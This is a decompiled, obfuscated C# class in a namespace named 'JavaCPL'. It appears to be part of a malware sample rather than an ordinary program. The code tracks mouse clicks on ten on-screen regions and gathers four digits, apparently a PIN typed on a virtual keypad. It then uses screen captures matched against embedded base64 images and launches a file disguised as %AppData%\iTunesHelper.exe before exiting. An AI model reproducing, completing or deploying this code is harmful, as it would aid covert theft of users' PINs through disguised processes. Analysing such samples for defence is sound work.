using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace JavaCPL;

public static class GClass1
{
	private static Point point_0;

	public static List<int> list_0 = new List<int>();

	public static void smethod_0(int int_0, int int_1)
	{
		Point point_ = GClass2.point_1;
		Point point = point_;
		Rectangle empty = Rectangle.Empty;
		if (point == empty.Location)
		{
			return;
		}
		int_0 -= point_0.X;
		int_1 -= point_0.Y;
		Rectangle rectangle = new Rectangle(point_.X + 300, point_.Y + 155, 155, 21);
		if (smethod_1(int_0, int_1, rectangle.Left, rectangle.Top, rectangle.Right, rectangle.Bottom))
		{
			list_0 = new List<int>();
		}
		for (int i = 0; i < 10; i++)
		{
			GClass2.RECT rECT = GClass2.rect_0[i];
			if (!smethod_1(int_0, int_1, rECT.left, rECT.top, rECT.right, rECT.bottom))
			{
				continue;
			}
			list_0.Add(GClass2.int_2[i]);
			if (list_0.Count != 4)
			{
				continue;
			}
			GClass0.bool_0 = true;
			GClass2.bool_0 = true;
			try
			{
				((Image)GClass2.bitmap_0).Dispose();
			}
			catch
			{
			}
			int tickCount = Environment.TickCount;
			while (Environment.TickCount - tickCount < 6000)
			{
				Thread.Sleep(4000);
				if (!smethod_4())
				{
					continue;
				}
				GClass6.smethod_1();
				Thread.Sleep(500);
				GClass6.smethod_3();
				list_0 = new List<int>();
				if (File.Exists(Environment.GetEnvironmentVariable("AppData") + "\\iTunesHelper.exe"))
				{
					try
					{
						Process.Start(Environment.GetEnvironmentVariable("AppData") + "\\iTunesHelper.exe");
						GClass0.smethod_1();
						Environment.Exit(0);
					}
					catch (Exception)
					{
						try
						{
							Application.Restart();
						}
						catch (Exception)
						{
							GClass0.smethod_1();
							Environment.Exit(0);
						}
					}
				}
				else
				{
					try
					{
						Application.Restart();
					}
					catch (Exception)
					{
						GClass0.smethod_1();
						Environment.Exit(0);
					}
				}
			}
			GClass0.bool_0 = false;
			GClass2.bool_0 = false;
			list_0 = new List<int>();
		}
	}

	public static bool smethod_1(int int_0, int int_1, int int_2, int int_3, int int_4, int int_5)
	{
		if (int_0 > int_2 && int_0 < int_4 && int_1 < int_5 && int_1 > int_3)
		{
			return true;
		}
		return false;
	}

	public static int smethod_2(int int_0, int int_1)
	{
		int num = 0;
		while (true)
		{
			if (num < GClass2.rect_0.Length)
			{
				GClass2.RECT rECT = GClass2.rect_0[num];
				if (smethod_1(int_0, int_1, rECT.left, rECT.top, rECT.right, rECT.bottom))
				{
					break;
				}
				num++;
				continue;
			}
			return -1;
		}
		return num;
	}

	public static Bitmap smethod_3(string string_0)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		bool flag = false;
		while (flag)
		{
			flag = false;
		}
		try
		{
			byte[] array = new byte[1];
			Bitmap val = new Bitmap(1, 1);
			array = Convert.FromBase64String(string_0);
			TypeConverter converter = TypeDescriptor.GetConverter(typeof(Bitmap));
			return (Bitmap)converter.ConvertFrom(array);
		}
		catch (Exception)
		{
			flag = true;
			return new Bitmap(1, 1);
		}
	}

	public static bool smethod_4()
	{
		Point point = new Point(0, 0);
		Bitmap val = smethod_3("iVBORw0KGgoAAAANSUhEUgAAABUAAAAGCAIAAACjN0L0AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsAAAA7AAWrWiQkAAAB7SURBVChTY3C1NkBDbraGBJG7nREEMQA1u1jpIyNXG4NNhQxPVjE82cXw588bIAMogobgFqDrh6gz1xdrNIeiAHN1XPqBdjMATQJKA+1HVkSM/RBfQ/Wj2YBmP5Dr4aBfmBgAJKEqYaGGXT+a/WD96hD9kJCCWO5spQ8A3zNn1Sw/OrAAAAAASUVORK5CYII=");
		Bitmap val2 = GClass4.smethod_10(out point_0);
		point = smethod_7(val, val2, 0.4).Location;
		bool result = false;
		if (point.X + point.Y > 0)
		{
			result = true;
		}
		else
		{
			Thread.Sleep(200);
			val = smethod_3("iVBORw0KGgoAAAANSUhEUgAAAA8AAAANCAIAAAD5fKMWAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsAAAA7AAWrWiQkAAACeSURBVChTvZA9CsJAFAZzGJukixYuWCQgBMWQRAwqapMuWHkEb2DpdTPwwWNXtkglTLOP2dmfxC2z+STzVcy/2es8FcPtYDzOO9A8uAnre1/J+37exqXbMo/YZCS9xquPKkGbBkgtXWpUxYoJoV9barvfwKkuoG9KEtoQsTFkG3ZmYONZ2FfJ68yIrQvI9l/yHI6BTUP/IEloguryxQRqD5qjt7/emwAAAABJRU5ErkJggg==");
			point = smethod_7(val, val2, 0.4).Location;
			if (point.X + point.Y > 0)
			{
				result = true;
			}
		}
		((Image)val2).Dispose();
		((Image)val).Dispose();
		return result;
	}

	public static Bitmap smethod_5()
	{
		return smethod_3("iVBORw0KGgoAAAANSUhEUgAAAAgAAAAHCAIAAAC6O5sJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsAAAA7AAWrWiQkAAAAgSURBVBhXY1jVVIcVMdBIIliAM0qIC0gCEYodBCQgmgAV/U5xB2QKQQAAAABJRU5ErkJggg==");
	}

	public static Point smethod_6()
	{
		Bitmap val = smethod_5();
		GClass2.bitmap_0 = GClass4.smethod_10(out point_0);
		Point location = smethod_7(val, GClass2.bitmap_0, 0.2).Location;
		Point result = new Point(location.X, location.Y);
		((Image)GClass2.bitmap_0).Dispose();
		((Image)val).Dispose();
		return result;
	}

	public unsafe static Rectangle smethod_7(Bitmap bitmap_0, Bitmap bitmap_1, double double_0)
	{
		Rectangle empty = Rectangle.Empty;
		try
		{
			BitmapData val = bitmap_0.LockBits(new Rectangle(0, 0, ((Image)bitmap_0).get_Width(), ((Image)bitmap_0).get_Height()), (ImageLockMode)1, (PixelFormat)137224);
			BitmapData val2 = bitmap_1.LockBits(new Rectangle(0, 0, ((Image)bitmap_1).get_Width(), ((Image)bitmap_1).get_Height()), (ImageLockMode)1, (PixelFormat)137224);
			int stride = val.get_Stride();
			int stride2 = val2.get_Stride();
			int width = ((Image)bitmap_1).get_Width();
			int num = ((Image)bitmap_1).get_Height() - ((Image)bitmap_0).get_Height() + 1;
			int num2 = ((Image)bitmap_0).get_Width() * 3;
			int height = ((Image)bitmap_0).get_Height();
			int num3 = Convert.ToInt32(255.0 * double_0);
			byte* ptr = (byte*)(void*)val.get_Scan0();
			byte* ptr2 = (byte*)(void*)val2.get_Scan0();
			((Image)bitmap_0).get_Width();
			int num4 = stride2 - ((Image)bitmap_1).get_Width() * 3;
			bool flag = true;
			for (int i = 0; i < num; i++)
			{
				for (int j = 0; j < width; j++)
				{
					byte* ptr3 = ptr2;
					byte* ptr4 = ptr;
					for (int k = 0; k < height; k++)
					{
						int num5 = 0;
						flag = true;
						for (num5 = 0; num5 < num2; num5++)
						{
							int num6 = *ptr2 - num3;
							int num7 = *ptr2 + num3;
							if (num7 >= *ptr && num6 <= *ptr)
							{
								ptr2++;
								ptr++;
								continue;
							}
							flag = false;
							break;
						}
						if (!flag)
						{
							break;
						}
						ptr = ptr4;
						ptr2 = ptr3;
						ptr += (nint)stride * (nint)(1 + k);
						ptr2 += (nint)stride2 * (nint)(1 + k);
					}
					if (!flag)
					{
						ptr2 = ptr3;
						ptr = ptr4;
						ptr2 += 3;
						continue;
					}
					empty.X = j;
					empty.Y = i;
					empty.Width = ((Image)bitmap_0).get_Width();
					empty.Height = ((Image)bitmap_0).get_Height();
					break;
				}
				if (flag)
				{
					break;
				}
				ptr2 += num4;
			}
			bitmap_1.UnlockBits(val2);
			bitmap_0.UnlockBits(val);
			return empty;
		}
		catch (Exception)
		{
			return Rectangle.Empty;
		}
	}
}
